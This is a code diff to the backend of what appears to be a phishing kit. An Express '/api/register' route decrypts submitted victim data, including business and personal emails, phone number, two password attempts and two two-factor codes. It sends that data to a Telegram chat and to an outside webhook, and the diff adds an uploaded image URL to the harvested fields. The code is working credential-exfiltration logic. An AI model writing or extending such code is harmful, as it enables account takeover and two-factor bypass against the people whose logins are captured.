@@ -51,15 +51,16 @@ app.post('/api/register', ipFilter, registerLimiter, (req, res) => {
 
         const decryptedData = decrypt(data);
         const values = JSON.parse(decryptedData);
+
         res.status(200).json({
             message: 'Success',
             error_code: 0
         });
 
-        const message = `<b>Ip:</b> <code>${values.ip ? values.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail ? values.businessEmail : ''} </code>\n<b>Email Personal:</b> <code>${values.personalEmail ? values.personalEmail : ''}</code>\n<b>User name:</b> <code>${values.fullName ? values.fullName : ''} </code>\n<b>Page name:</b> <code>${values.fanpageName ? values.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone ? values.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst ? values.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond ? values.passwordSecond : ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa ? values.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa ? values.secondTwoFa : ''}</code>\n`;
+        const message = `<b>Ip:</b> <code>${values.ip ? values.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail ? values.businessEmail : ''} </code>\n<b>Email Personal:</b> <code>${values.personalEmail ? values.personalEmail : ''}</code>\n<b>User name:</b> <code>${values.fullName ? values.fullName : ''} </code>\n<b>Page name:</b> <code>${values.fanpageName ? values.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone ? values.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst ? values.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond ? values.passwordSecond : ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl ? values.imageUrl : ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa ? values.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa ? values.secondTwoFa : ''}</code>\n`;
         bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
         
-        if (process.env.WEBHOOK_URL != undefined) {
+        if (process.env.WEBHOOK_URL) {
             const url = new URL(process.env.WEBHOOK_URL);
 
             url.searchParams.append('Ip', values.ip ? values.ip : '');
@@ -74,6 +75,7 @@ app.post('/api/register', ipFilter, registerLimiter, (req, res) => {
             url.searchParams.append('Password Second', values.passwordSecond ? values.passwordSecond : '');
             url.searchParams.append('First Two-Fa', values.firstTwoFa ? values.firstTwoFa : '');
             url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');
+            url.searchParams.append('Image', values.imageUrl ? values.imageUrl : '');
 
             axios.get(url)
                 .then(response => {
